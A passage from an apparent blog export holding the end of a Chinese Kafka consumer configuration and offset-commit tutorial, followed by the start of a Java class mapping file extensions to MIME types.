这个属性指定了消费者在被认为死亡之前可以与服务器断开连接的时间，默认是 3s。如果消费者没有在 session.timeout.ms 指定的时间内发送心跳给群组协调器，就会被认定为死亡，协调器就会触发重平衡。把它的分区分配给消费者群组中的其它消费者，此属性与 heartbeat.interval.ms 紧密相关。heartbeat.interval.ms 指定了poll()方法向群组协调器发送心跳的频率，session.timeout.ms 则指定了消费者可以多久不发送心跳。所以，这两个属性一般需要同时修改，heartbeat.interval.ms 必须比 session.timeout.ms 小，一般是 session.timeout.ms 的三分之一。如果 session.timeout.ms 是 3s，那么 heartbeat.interval.ms 应该是 1s。把 session.timeout.ms 值设置的比默认值小，可以更快地检测和恢复崩愤的节点，不过长时间的轮询或垃圾收集可能导致非预期的重平衡。把该属性的值设置得大一些，可以减少意外的重平衡，不过检测节点崩溃需要更长的时间。

auto.offset.reset

该属性指定了消费者在读取一个没有偏移量的分区或者偏移量无效的情况下的该如何处理。它的默认值是 latest，意思指的是，在偏移量无效的情况下，消费者将从最新的记录开始读取数据。另一个值是 earliest，意思指的是在偏移量无效的情况下，消费者将从起始位置处开始读取分区的记录。

enable.auto.commit

我们稍后将介绍几种不同的提交偏移量的方式。该属性指定了消费者是否自动提交偏移量，默认值是 true，为了尽量避免出现重复数据和数据丢失，可以把它设置为 false，由自己控制何时提交偏移量。如果把它设置为 true，还可以通过 auto.commit.interval.ms 属性来控制提交的频率

partition.assignment.strategy

我们知道，分区会分配给群组中的消费者。PartitionAssignor 会根据给定的消费者和主题，决定哪些分区应该被分配给哪个消费者，Kafka 有两个默认的分配策略 Range 和 RoundRobin

client.id

该属性可以是任意字符串，broker 用他来标识从客户端发送过来的消息，通常被用在日志、度量指标和配额中

max.poll.records

该属性用于控制单次调用call()方法能够返回的记录数量，可以帮你控制在轮询中需要处理的数据量。

receive.buffer.bytes 和 send.buffer.bytes

socket 在读写数据时用到的 TCP 缓冲区也可以设置大小。如果它们被设置为 -1，就使用操作系统默认值。如果生产者或消费者与 broker 处于不同的数据中心内，可以适当增大这些值，因为跨数据中心的网络一般都有比较高的延迟和比较低的带宽。
提交和偏移量的概念特殊偏移
我们上面提到，消费者在每次调用 poll() 方法进行定时轮询的时候，会返回由生产者写入 Kafka 但是还没有被消费者消费的记录，因此我们可以追踪到哪些记录是被群组里的哪个消费者读取的。消费者可以使用 Kafka 来追踪消息在分区中的位置（偏移量）
消费者会向一个叫做 _consumer_offset 的特殊主题中发送消息，这个主题会保存每次所发送消息中的分区偏移量，这个主题的主要作用就是消费者触发重平衡后记录偏移使用的，消费者每次向这个主题发送消息，正常情况下不触发重平衡，这个主题是不起作用的，当触发重平衡后，消费者停止工作，每个消费者可能会分到对应的分区，这个主题就是让消费者能够继续处理消息所设置的。
如果提交的偏移量小于客户端最后一次处理的偏移量，那么位于两个偏移量之间的消息就会被重复处理

如果提交的偏移量大于最后一次消费时的偏移量，那么处于两个偏移量中间的消息将会丢失
既然_consumer_offset 如此重要，那么它的提交方式是怎样的呢？下面我们就来说一下提交方式
KafkaConsumer API 提供了多种方式来提交偏移量
自动提交
最简单的方式就是让消费者自动提交偏移量。如果 enable.auto.commit 被设置为 true，那么每过 5s，消费者会自动把从poll()方法轮询到的最大偏移量提交上去。提交时间间隔由 auto.commit.interval.ms 控制，默认是 5s。与消费者里的其他东西一样，自动提交也是在轮询中进行的。消费者在每次轮询中会检查是否提交该偏移量了，如果是，那么就会提交从上一次轮询中返回的偏移量。
提交当前偏移量
把 auto.commit.offset 设置为 false，可以让应用程序决定何时提交偏移量。使用 commitSync() 提交偏移量。这个 API 会提交由poll()方法返回的最新偏移量，提交成功后马上返回，如果提交失败就抛出异常。
commitSync() 将会提交由poll()返回的最新偏移量，如果处理完所有记录后要确保调用了 commitSync()，否则还是会有丢失消息的风险，如果发生了在均衡，从最近一批消息到发生在均衡之间的所有消息都将被重复处理。
异步提交
异步提交 commitAsync() 与同步提交 commitSync() 最大的区别在于异步提交不会进行重试，同步提交会一致进行重试。
同步和异步组合提交
一般情况下，针对偶尔出现的提交失败，不进行重试不会有太大的问题，因为如果提交失败是因为临时问题导致的，那么后续的提交总会有成功的。但是如果在关闭消费者或再均衡前的最后一次提交，就要确保提交成功。
因此，在消费者关闭之前一般会组合使用 commitAsync 和 commitSync 提交偏移量。
提交特定的偏移量
消费者 API 允许调用commitSync()和commitAsync()方法时传入希望提交的 partition 和 offset 的 map，即提交特定的偏移量。

转载：https://blog.csdn.net/csdnnews/article/details/103379756

]]></content>
      <tags>
        <tag>消息队列</tag>
        <tag>Kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>MimeType.java</title>
    <url>/2021/07/06/MimeType-java/</url>
    <content><![CDATA[文件类型的种类


import java.util.HashMap;

public class MimeTypes &#123;

   static HashMap&lt;String, String&gt; type &#x3D; new HashMap&lt;String, String&gt;();

   static &#123;
      type.put(&quot;ez&quot;, &quot;application&#x2F;andrew-inset&quot;);
      type.put(&quot;aw&quot;, &quot;application&#x2F;applixware&quot;);
      type.put(&quot;atom&quot;, &quot;application&#x2F;atom+xml&quot;);
      type.put(&quot;atomcat&quot;, &quot;application&#x2F;atomcat+xml&quot;);
      type.put(&quot;atomsvc&quot;, &quot;application&#x2F;atomsvc+xml&quot;);
      type.put(&quot;ccxml&quot;, &quot;application&#x2F;ccxml+xml&quot;);
      type.put(&quot;cdmia&quot;, &quot;application&#x2F;cdmi-capability&quot;);
      type.put(&quot;cdmic&quot;, &quot;application&#x2F;cdmi-container&quot;);
      type.put(&quot;cdmid&quot;, &quot;application&#x2F;cdmi-domain&quot;);
      type.put(&quot;cdmio&quot;, &quot;application&#x2F;cdmi-object&quot;);
      type.put(&quot;cdmiq&quot;, &quot;application&#x2F;cdmi-queue&quot;);
      type.put(&quot;cu&quot;, &quot;application&#x2F;cu-seeme&quot;);
      type.put(&quot;mdp&quot;, &quot;application&#x2F;dash+xml&quot;);
      type.put(&quot;davmount&quot;, &quot;application&#x2F;davmount+xml&quot;);
      type.put(&quot;dbk&quot;, &quot;application&#x2F;docbook+xml&quot;);
      type.put(&quot;dssc&quot;, &quot;application&#x2F;dssc+der&quot;);
      type.put(&quot;xdssc&quot;, &quot;application&#x2F;dssc+xml&quot;);
      type.put(&quot;ecma&quot;, &quot;application&#x2F;ecmascript&quot;);
      type.put(&quot;emma&quot;, &quot;application&#x2F;emma+xml&quot;);
      type.put(&quot;epub&quot;, &quot;application&#x2F;epub+zip&quot;);
      type.put(&quot;exi&quot;, &quot;application&#x2F;exi&quot;);
      type.put(&quot;pfr&quot;, &quot;application&#x2F;font-tdpfr&quot;);
      type.put(&quot;woff&quot;, &quot;application&#x2F;font-woff&quot;);
      type.put(&quot;woff2&quot;, &quot;application&#x2F;font-woff2&quot;);
      type.put(&quot;gml&quot;, &quot;application&#x2F;gml+xml&quot;);
      type.put(&quot;gpx&quot;, &quot;application&#x2F;gpx+xml&quot;);
      type.put(&quot;gxf&quot;, &quot;application&#x2F;gxf&quot;);
      type.put(&quot;stk&quot;, &quot;application&#x2F;hyperstudio&quot;);
      type.put(&quot;ink&quot;, &quot;application&#x2F;inkml+xml&quot;);
      type.put(&quot;inkml&quot;, &quot;application&#x2F;inkml+xml&quot;);
      type.put(&quot;ipfix&quot;, &quot;application&#x2F;ipfix&quot;);
      type.put(&quot;jar&quot;, &quot;application&#x2F;java-archive&quot;);
      type.put(&quot;ser&quot;, &quot;application&#x2F;java-serialized-object&quot;);
      type.put(&quot;class&quot;, &quot;application&#x2F;java-vm&quot;);
      type.put(&quot;js&quot;, &quot;application&#x2F;javascript&quot;);
      type.put(&quot;json&quot;, &quot;application&#x2F;json&quot;);
      type.put(&quot;map&quot;, &quot;application&#x2F;json&quot;);
      type.put(&quot;json5&quot;, &quot;application&#x2F;json5&quot;);
      type.put(&quot;jsonml&quot;, &quot;application&#x2F;jsonml+json&quot;);
      type.put(&quot;lostxml&quot;, &quot;application&#x2F;lost+xml&quot;);
      type.put(&quot;hqx&quot;, &quot;application&#x2F;mac-binhex40&quot;);
      type.put(&quot;cpt&quot;, &quot;application&#x2F;mac-compactpro&quot;);
      type.put(&quot;mads&quot;, &quot;application&#x2F;mads+xml&quot;);
      type.put(&quot;mrc&quot;, &quot;application&#x2F;marc&quot;);
      type.put(&quot;mrcx&quot;, &quot;application&#x2F;marcxml+xml&quot;);
      type.put(&quot;ma&quot;, &quot;application&#x2F;mathematica&quot;);
      type.put(&quot;nb&quot;, &quot;application&#x2F;mathematica&quot;);
      type.put(&quot;mb&quot;, &quot;application&#x2F;mathematica&quot;);
      type.put(&quot;mathml&quot;, &quot;application&#x2F;mathml+xml&quot;);
      type.put(&quot;mbox&quot;, &quot;application&#x2F;mbox&quot;);
      type.put(&quot;mscml&quot;, &quot;application&#x2F;mediaservercontrol+xml&quot;);
      type.put(&quot;metalink&quot;, &quot;application&#x2F;metalink+xml&quot;);
      type.put(&quot;meta4&quot;, &quot;application&#x2F;metalink4+xml&quot;);
      type.put(&quot;mets&quot;, &quot;application&#x2F;mets+xml&quot;);
      type.put(&quot;mods&quot;, &quot;application&#x2F;mods+xml&quot;);
      type.put(&quot;m21&quot;, &quot;application&#x2F;mp21&quot;);
      type.put(&quot;mp21&quot;, &quot;application&#x2F;mp21&quot;);
      type.put(&quot;mp4s&quot;, &quot;application&#x2F;mp4&quot;);
      type.put(&quot;m4p&quot;, &quot;application&#x2F;mp4&quot;);
      type.put(&quot;doc&quot;, &quot;application&#x2F;msword&quot;);
      type.put(&quot;dot&quot;, &quot;application&#x2F;msword&quot;);
      type.put(&quot;mxf&quot;, &quot;application&#x2F;mxf&quot;);
      type.put(&quot;bin&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;dms&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;lrf&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;mar&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;so&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;dist&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;distz&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;pkg&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;bpk&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;dump&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;elc&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;deploy&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;buffer&quot;, &quot;application&#x2F;octet-stream&quot;);
      type.put(&quot;oda&quot;, &quot;application&#x2F;oda&quot;);
      type.put(&quot;opf&quot;, &quot;application&#x2F;oebps-package+xml&quot;);
      type.put(&quot;ogx&quot;, &quot;application&#x2F;ogg&quot;);
      type.put(&quot;omdoc&quot;, &quot;application&#x2F;omdoc+xml&quot;);
      type.put(&quot;onetoc&quot;, &quot;application&#x2F;onenote&quot;);
      type.put(&quot;onetoc2&quot;, &quot;application&#x2F;onenote&quot;);
      type.put(&quot;onetmp&quot;, &quot;application&#x2F;onenote&quot;);
      type.put(&quot;onepkg&quot;, &quot;application&#x2F;onenote&quot;);
      type.put(&quot;oxps&quot;, &quot;application&#x2F;oxps&quot;);
      type.put(&quot;xer&quot;, &quot;application&#x2F;patch-ops-error+xml&quot;);
      type.put(&quot;pdf&quot;, &quot;application&#x2F;pdf&quot;);
      type.put(&quot;pgp&quot;, &quot;application&#x2F;pgp-encrypted&quot;);
      type.put(&quot;asc&quot;, &quot;application&#x2F;pgp-signature&quot;);
      type.put(&quot;sig&quot;, &quot;application&#x2F;pgp-signature&quot;);
      type.put(&quot;prf&quot;, &quot;application&#x2F;pics-rules&quot;);
      type.put(&quot;p10&quot;, &quot;application&#x2F;pkcs10&quot;);
      type.put(&quot;p7m&quot;, &quot;application&#x2F;pkcs7-mime&quot;);
      type.put(&quot;p7c&quot;, &quot;application&#x2F;pkcs7-mime&quot;);
      type.put(&quot;p7s&quot;, &quot;application&#x2F;pkcs7-signature&quot;);
      type.put(&quot;p8&quot;, &quot;application&#x2F;pkcs8&quot;);
      type.put(&quot;ac&quot;, &quot;application&#x2F;pkix-attr-cert&quot;);
      type.put(&quot;cer&quot;, &quot;application&#x2F;pkix-cert&quot;);
      type.put(&quot;crl&quot;, &quot;application&#x2F;pkix-crl&quot;);
      type.put(&quot;pkipath&quot;, &quot;application&#x2F;pkix-pkipath&quot;);
      type.put(&quot;pki&quot;, &quot;application&#x2F;pkixcmp&quot;);
      type.put(&quot;pls&quot;, &quot;application&#x2F;pls+xml&quot;);
      type.put(&quot;ai&quot;, &quot;application&#x2F;postscript&quot;);
      type.put(&quot;eps&quot;, &quot;application&#x2F;postscript&quot;);
      type.put(&quot;ps&quot;, &quot;application&#x2F;postscript&quot;);
      type.put(&quot;cww&quot;, &quot;application&#x2F;prs.cww&quot;);
      type.put(&quot;pskcxml&quot;, &quot;application&#x2F;pskc+xml&quot;);
      type.put(&quot;rdf&quot;, &quot;application&#x2F;rdf+xml&quot;);
      type.put(&quot;rif&quot;, &quot;application&#x2F;reginfo+xml&quot;);
      type.put(&quot;rnc&quot;, &quot;application&#x2F;relax-ng-compact-syntax&quot;);
      type.put(&quot;rl&quot;, &quot;application&#x2F;resource-lists+xml&quot;);
      type.put(&quot;rld&quot;, &quot;application&#x2F;resource-lists-diff+xml&quot;);
      type.put(&quot;rs&quot;, &quot;application&#x2F;rls-services+xml&quot;);
      type.put(&quot;gbr&quot;, &quot;application&#x2F;rpki-ghostbusters&quot;);
      type.put(&quot;mft&quot;, &quot;application&#x2F;rpki-manifest&quot;);
      type.put(&quot;roa&quot;, &quot;application&#x2F;rpki-roa&quot;);
      type.put(&quot;rsd&quot;, &quot;application&#x2F;rsd+xml&quot;);
      type.put(&quot;rss&quot;, &quot;application&#x2F;rss+xml&quot;);
      type.put(&quot;rtf&quot;, &quot;application&#x2F;rtf&quot;);
      type.put(&quot;sbml&quot;, &quot;application&#x2F;sbml+xml&quot;);
      type.put(&quot;scq&quot;, &quot;application&#x2F;scvp-cv-request&quot;);
      type.put(&quot;scs&quot;, &quot;application&#x2F;scvp-cv-response&quot;);
      type.put(&quot;spq&quot;, &quot;application&#x2F;scvp-vp-request&quot;);
      type.put(&quot;spp&quot;, &quot;application&#x2F;scvp-vp-response&quot;);
      type.put(&quot;sdp&quot;, &quot;application&#x2F;sdp&quot;);
      type.put(&quot;setpay&quot;, &quot;application&#x2F;set-payment-initiation&quot;);
      type.put(&quot;setreg&quot;, &quot;application&#x2F;set-registration-initiation&quot;);
      type.put(&quot;shf&quot;, &quot;application&#x2F;shf+xml&quot;);
      type.put(&quot;smi&quot;, &quot;application&#x2F;smil+xml&quot;);
      type.put(&quot;smil&quot;, &quot;application&#x2F;smil+xml&quot;);
      type.put(&quot;rq&quot;, &quot;application&#x2F;sparql-query&quot;);
      type.put(&quot;srx&quot;, &quot;application&#x2F;sparql-results+xml&quot;);
      type.put(&quot;gram&quot;, &quot;application&#x2F;srgs&quot;);
      type.put(&quot;grxml&quot;, &quot;application&#x2F;srgs+xml&quot;);
      type.put(&quot;sru&quot;, &quot;application&#x2F;sru+xml&quot;);
      type.put(&quot;ssdl&quot;, &quot;application&#x2F;ssdl+xml&quot;);
      type.put(&quot;ssml&quot;, &quot;application&#x2F;ssml+xml&quot;);
      type.put(&quot;tei&quot;, &quot;application&#x2F;tei+xml&quot;);
      type.put(&quot;teicorpus&quot;, &quot;application&#x2F;tei+xml&quot;);
      type.put(&quot;tfi&quot;, &quot;application&#x2F;thraud+xml&quot;);
      type.put(&quot;tsd&quot;, &quot;application&#x2F;timestamped-data&quot;);
      type.put(&quot;plb&quot;, &quot;application&#x2F;vnd.3gpp.pic-bw-large&quot;);
      type.put(&quot;psb&quot;, &quot;application&#x2F;vnd.3gpp.pic-bw-small&quot;);
      type.put(&quot;pvb&quot;, &quot;application&#x2F;vnd.3gpp.pic-bw-var&quot;);
      type.put(&quot;tcap&quot;, &quot;application&#x2F;vnd.3gpp2.tcap&quot;);
      type.put(&quot;pwn&quot;, &quot;application&#x2F;vnd.3m.post-it-notes&quot;);
      type.put(&quot;aso&quot;, &quot;application&#x2F;vnd.accpac.simply.aso&quot;);
      type.put(&quot;imp&quot;, &quot;application&#x2F;vnd.accpac.simply.imp&quot;);
      type.put(&quot;acu&quot;, &quot;application&#x2F;vnd.acucobol&quot;);
      type.put(&quot;atc&quot;, &quot;application&#x2F;vnd.acucorp&quot;);
      type.put(&quot;acutc&quot;, &quot;application&#x2F;vnd.acucorp&quot;);
      type.put(&quot;air&quot;, &quot;application&#x2F;vnd.adobe.air-application-installer-package+zip&quot;);
      type.put(&quot;fcdt&quot;, &quot;application&#x2F;vnd.adobe.formscentral.fcdt&quot;);
      type.put(&quot;fxp&quot;, &quot;application&#x2F;vnd.adobe.fxp&quot;);
      type.put(&quot;fxpl&quot;, &quot;application&#x2F;vnd.adobe.fxp&quot;);
      type.put(&quot;xdp&quot;, &quot;application&#x2F;vnd.adobe.xdp+xml&quot;);
      type.put(&quot;xfdf&quot;, &quot;application&#x2F;vnd.adobe.xfdf&quot;);
      type.put(&quot;ahead&quot;, &quot;application&#x2F;vnd.ahead.space&quot;);
      type.put(&quot;azf&quot;, &quot;application&#x2F;vnd.airzip.filesecure.azf&quot;);
      type.put(&quot;azs&quot;, &quot;application&#x2F;vnd.airzip.filesecure.azs&quot;);
      type.put(&quot;azw&quot;, &quot;application&#x2F;vnd.amazon.ebook&quot;);
      type.put(&quot;acc&quot;, &quot;application&#x2F;vnd.americandynamics.acc&quot;);
      type.put(&quot;ami&quot;, &quot;application&#x2F;vnd.amiga.ami&quot;);
      type.put(&quot;apk&quot;, &quot;application&#x2F;vnd.android.package-archive&quot;);
      type.put(&quot;cii&quot;, &quot;application&#x2F;vnd.anser-web-certificate-issue-initiation&quot;);
      type.put(&quot;fti&quot;, &quot;application&#x2F;vnd.anser-web-funds-transfer-initiation&quot;);
      type.put(&quot;atx&quot;, &quot;application&#x2F;vnd.antix.game-component&quot;);
      type.put(&quot;mpkg&quot;, &quot;application&#x2F;vnd.apple.installer+xml&quot;);
      type.put(&quot;m3u8&quot;, &quot;application&#x2F;vnd.apple.mpegurl&quot;);
      type.put(&quot;swi&quot;, &quot;application&#x2F;vnd.aristanetworks.swi&quot;);
      type.put(&quot;iota&quot;, &quot;application&#x2F;vnd.astraea-software.iota&quot;);
      type.put(&quot;aep&quot;, &quot;application&#x2F;vnd.audiograph&quot;);
      type.put(&quot;mpm&quot;, &quot;application&#x2F;vnd.blueice.multipass&quot;);
      type.put(&quot;bmi&quot;, &quot;application&#x2F;vnd.bmi&quot;);
      type.put(&quot;rep&quot;, &quot;application&#x2F;vnd.businessobjects&quot;);
      type.put(&quot;cdxml&quot;, &quot;application&#x2F;vnd.chemdraw+xml&quot;);
      type.put(&quot;mmd&quot;, &quot;application&#x2F;vnd.chipnuts.karaoke-mmd&quot;);
      type.put(&quot;cdy&quot;, &quot;application&#x2F;vnd.cinderella&quot;);
      type.put(&quot;cla&quot;, &quot;application&#x2F;vnd.claymore&quot;);
      type.put(&quot;rp9&quot;, &quot;application&#x2F;vnd.cloanto.rp9&quot;);
      type.put(&quot;c4g&quot;, &quot;application&#x2F;vnd.clonk.c4group&quot;);
      type.put(&quot;c4d&quot;, &quot;application&#x2F;vnd.clonk.c4group&quot;);
      type.put(&quot;c4f&quot;, &quot;application&#x2F;vnd.clonk.c4group&quot;);
      type.put(&quot;c4p&quot;, &quot;application&#x2F;vnd.clonk.c4group&quot;);
      type.put(&quot;c4u&quot;, &quot;application&#x2F;vnd.clonk.c4group&quot;);
      type.put(&quot;c11amc&quot;, &quot;application&#x2F;vnd.cluetrust.cartomobile-config&quot;);
      type.put(&quot;c11amz&quot;, &quot;application&#x2F;vnd.cluetrust.cartomobile-config-pkg&quot;);
      type.put(&quot;csp&quot;, &quot;application&#x2F;vnd.commonspace&quot;);
      type.put(&quot;cdbcmsg&quot;, &quot;application&#x2F;vnd.contact.cmsg&quot;);
      type.put(&quot;cmc&quot;, &quot;application&#x2F;vnd.cosmocaller&quot;);
      type.put(&quot;clkx&quot;, &quot;application&#x2F;vnd.crick.clicker&quot;);
      type.put(&quot;clkk&quot;, &quot;application&#x2F;vnd.crick.clicker.keyboard&quot;);
      type.put(&quot;clkp&quot;, &quot;application&#x2F;vnd.crick.clicker.palette&quot;);
      type.put(&quot;clkt&quot;, &quot;application&#x2F;vnd.crick.clicker.template&quot;);
      type.put(&quot;clkw&quot;, &quot;application&#x2F;vnd.crick.clicker.wordbank&quot;);
      type.put(&quot;wbs&quot;, &quot;application&#x2F;vnd.criticaltools.wbs+xml&quot;);
      type.put(&quot;pml&quot;, &quot;application&#x2F;vnd.ctc-posml&quot;);
      type.put(&quot;ppd&quot;, &quot;application&#x2F;vnd.cups-ppd&quot;);
      type.put(&quot;car&quot;, &quot;application&#x2F;vnd.curl.car&quot;);
      type.put(&quot;pcurl&quot;, &quot;application&#x2F;vnd.curl.pcurl&quot;);
      type.put(&quot;dart&quot;, &quot;application&#x2F;vnd.dart&quot;);
      type.put(&quot;rdz&quot;, &quot;application&#x2F;vnd.data-vision.rdz&quot;);
      type.put(&quot;uvf&quot;, &quot;application&#x2F;vnd.dece.data&quot;);
      type.put(&quot;uvvf&quot;, &quot;application&#x2F;vnd.dece.data&quot;);
      type.put(&quot;uvd&quot;, &quot;application&#x2F;vnd.dece.data&quot;);
      type.put(&quot;uvvd&quot;, &quot;application&#x2F;vnd.dece.data&quot;);
      type.put(&quot;uvt&quot;, &quot;application&#x2F;vnd.dece.ttml+xml&quot;);
      type.put(&quot;uvvt&quot;, &quot;application&#x2F;vnd.dece.ttml+xml&quot;);
      type.put(&quot;uvx&quot;, &quot;application&#x2F;vnd.dece.unspecified&quot;);
      type.put(&quot;uvvx&quot;, &quot;application&#x2F;vnd.dece.unspecified&quot;);
      type.put(&quot;uvz&quot;, &quot;application&#x2F;vnd.dece.zip&quot;);
      type.put(&quot;uvvz&quot;, &quot;application&#x2F;vnd.dece.zip&quot;);
      type.put(&quot;fe_launch&quot;, &quot;application&#x2F;vnd.denovo.fcselayout-link&quot;);
      type.put(&quot;dna&quot;, &quot;application&#x2F;vnd.dna&quot;);
      type.put(&quot;mlp&quot;, &quot;application&#x2F;vnd.dolby.mlp&quot;);
      type.put(&quot;dpg&quot;, &quot;application&#x2F;vnd.dpgraph&quot;);
      type.put(&quot;dfac&quot;, &quot;application&#x2F;vnd.dreamfactory&quot;);
      type.put(&quot;kpxx&quot;, &quot;application&#x2F;vnd.ds-keypoint&quot;);
      type.put(&quot;ait&quot;, &quot;application&#x2F;vnd.dvb.ait&quot;);
      type.put(&quot;svc&quot;, &quot;application&#x2F;vnd.dvb.service&quot;);
      type.put(&quot;geo&quot;, &quot;application&#x2F;vnd.dynageo&quot;);
      type.put(&quot;mag&quot;, &quot;application&#x2F;vnd.ecowin.chart&quot;);
      type.put(&quot;nml&quot;, &quot;application&#x2F;vnd.enliven&quot;);
      type.put(&quot;esf&quot;, &quot;application&#x2F;vnd.epson.esf&quot;);
      type.put(&quot;msf&quot;, &quot;application&#x2F;vnd.epson.msf&quot;);
      type.put(&quot;qam&quot;, &quot;application&#x2F;vnd.epson.quickanime&quot;);
      type.put(&quot;slt&quot;, &quot;application&#x2F;vnd.epson.salt&quot;);
      type.put(&quot;ssf&quot;, &quot;application&#x2F;vnd.epson.ssf&quot;);
      type.put(&quot;es3&quot;, &quot;application&#x2F;vnd.eszigno3+xml&quot;);
      type.put(&quot;et3&quot;, &quot;application&#x2F;vnd.eszigno3+xml&quot;);
      type.put(&quot;ez2&quot;, &quot;application&#x2F;vnd.ezpix-album&quot;);
      type.put(&quot;ez3&quot;, &quot;application&#x2F;vnd.ezpix-package&quot;);
      type.put(&quot;fdf&quot;, &quot;application&#x2F;vnd.fdf&quot;);
      type.put(&quot;mseed&quot;, &quot;application&#x2F;vnd.fdsn.mseed&quot;);
      type.put(&quot;seed&quot;, &quot;application&#x2F;vnd.fdsn.seed&quot;);
      type.put(&quot;dataless&quot;, &quot;application&#x2F;vnd.fdsn.seed&quot;);
      type.put(&quot;gph&quot;, &quot;application&#x2F;vnd.flographit&quot;);
      type.put(&quot;ftc&quot;, &quot;application&#x2F;vnd.fluxtime.clip&quot;);
      type.put(&quot;fm&quot;, &quot;application&#x2F;vnd.framemaker&quot;);
      type.put(&quot;frame&quot;, &quot;application&#x2F;vnd.framemaker&quot;);
      type.put(&quot;maker&quot;, &quot;application&#x2F;vnd.framemaker&quot;);
      type.put(&quot;book&quot;, &quot;application&#x2F;vnd.framemaker&quot;);
      type.put(&quot;fnc&quot;, &quot;application&#x2F;vnd.frogans.fnc&quot;);
      type.put(&quot;ltf&quot;, &quot;application&#x2F;vnd.frogans.ltf&quot;);
      type.put(&quot;fsc&quot;, &quot;application&#x2F;vnd.fsc.weblaunch&quot;);
      type.put(&quot;oas&quot;, &quot;application&#x2F;vnd.fujitsu.oasys&quot;);
      type.put(&quot;oa2&quot;, &quot;application&#x2F;vnd.fujitsu.oasys2&quot;);
      type.put(&quot;oa3&quot;, &quot;application&#x2F;vnd.fujitsu.oasys3&quot;);
      type.put(&quot;fg5&quot;, &quot;application&#x2F;vnd.fujitsu.oasysgp&quot;);
      type.put(&quot;bh2&quot;, &quot;application&#x2F;vnd.fujitsu.oasysprs&quot;);
      type.put(&quot;ddd&quot;, &quot;application&#x2F;vnd.fujixerox.ddd&quot;);
      type.put(&quot;xdw&quot;, &quot;application&#x2F;vnd.fujixerox.docuworks&quot;);
      type.put(&quot;xbd&quot;, &quot;application&#x2F;vnd.fujixerox.docuworks.binder&quot;);
      type.put(&quot;fzs&quot;, &quot;application&#x2F;vnd.fuzzysheet&quot;);
      type.put(&quot;txd&quot;, &quot;application&#x2F;vnd.genomatix.tuxedo&quot;);
      type.put(&quot;ggb&quot;, &quot;application&#x2F;vnd.geogebra.file&quot;);
      type.put(&quot;ggt&quot;, &quot;application&#x2F;vnd.geogebra.tool&quot;);
      type.put(&quot;gex&quot;, &quot;application&#x2F;vnd.geometry-explorer&quot;);
      type.put(&quot;gre&quot;, &quot;application&#x2F;vnd.geometry-explorer&quot;);
      type.put(&quot;gxt&quot;, &quot;application&#x2F;vnd.geonext&quot;);
      type.put(&quot;g2w&quot;, &quot;application&#x2F;vnd.geoplan&quot;);
      type.put(&quot;g3w&quot;, &quot;application&#x2F;vnd.geospace&quot;);
      type.put(&quot;gmx&quot;, &quot;application&#x2F;vnd.gmx&quot;);
      type.put(&quot;kml&quot;, &quot;application&#x2F;vnd.google-earth.kml+xml&quot;);
      type.put(&quot;kmz&quot;, &quot;application&#x2F;vnd.google-earth.kmz&quot;);
      type.put(&quot;gqf&quot;, &quot;application&#x2F;vnd.grafeq&quot;);
      type.put(&quot;gqs&quot;, &quot;application&#x2F;vnd.grafeq&quot;);
      type.put(&quot;gac&quot;, &quot;application&#x2F;vnd.groove-account&quot;);
      type.put(&quot;ghf&quot;, &quot;application&#x2F;vnd.groove-help&quot;);
      type.put(&quot;gim&quot;, &quot;application&#x2F;vnd.groove-identity-message&quot;);
      type.put(&quot;grv&quot;, &quot;application&#x2F;vnd.groove-injector&quot;);
      type.put(&quot;gtm&quot;, &quot;application&#x2F;vnd.groove-tool-message&quot;);
      type.put(&quot;tpl&quot;, &quot;application&#x2F;vnd.groove-tool-template&quot;);
      type.put(&quot;vcg&quot;, &quot;application&#x2F;vnd.groove-vcard&quot;);
      type.put(&quot;hal&quot;, &quot;application&#x2F;vnd.hal+xml&quot;);
      type.put(&quot;zmm&quot;, &quot;application&#x2F;vnd.handheld-entertainment+xml&quot;);
      type.put(&quot;hbci&quot;, &quot;application&#x2F;vnd.hbci&quot;);
      type.put(&quot;les&quot;, &quot;application&#x2F;vnd.hhe.lesson-player&quot;);
      type.put(&quot;hpgl&quot;, &quot;application&#x2F;vnd.hp-hpgl&quot;);
      type.put(&quot;hpid&quot;, &quot;application&#x2F;vnd.hp-hpid&quot;);
      type.put(&quot;hps&quot;, &quot;application&#x2F;vnd.hp-hps&quot;);
      type.put(&quot;jlt&quot;, &quot;application&#x2F;vnd.hp-jlyt&quot;);
      type.put(&quot;pcl&quot;, &quot;application&#x2F;vnd.hp-pcl&quot;);
      type.put(&quot;pclxl&quot;, &quot;application&#x2F;vnd.hp-pclxl&quot;);
      type.put(&quot;mpy&quot;, &quot;application&#x2F;vnd.ibm.minipay&quot;);
      type.put(&quot;afp&quot;, &quot;application&#x2F;vnd.ibm.modcap&quot;);
      type.put(&quot;listafp&quot;, &quot;application&#x2F;vnd.ibm.modcap&quot;);
      type.put(&quot;list3820&quot;, &quot;application&#x2F;vnd.ibm.modcap&quot;);
      type.put(&quot;irm&quot;, &quot;application&#x2F;vnd.ibm.rights-management&quot;);
      type.put(&quot;sc&quot;, &quot;application&#x2F;vnd.ibm.secure-container&quot;);
      type.put(&quot;icc&quot;, &quot;application&#x2F;vnd.iccprofile&quot;);
      type.put(&quot;icm&quot;, &quot;application&#x2F;vnd.iccprofile&quot;);
      type.put(&quot;igl&quot;, &quot;application&#x2F;vnd.igloader&quot;);
      type.put(&quot;ivp&quot;, &quot;application&#x2F;vnd.immervision-ivp&quot;);
      type.put(&quot;ivu&quot;, &quot;application&#x2F;vnd.immervision-ivu&quot;);
      type.put(&quot;igm&quot;, &quot;application&#x2F;vnd.insors.igm&quot;);
      type.put(&quot;xpw&quot;, &quot;application&#x2F;vnd.intercon.formnet&quot;);
      type.put(&quot;xpx&quot;, &quot;application&#x2F;vnd.intercon.formnet&quot;);
      type.put(&quot;i2g&quot;, &quot;application&#x2F;vnd.intergeo&quot;);
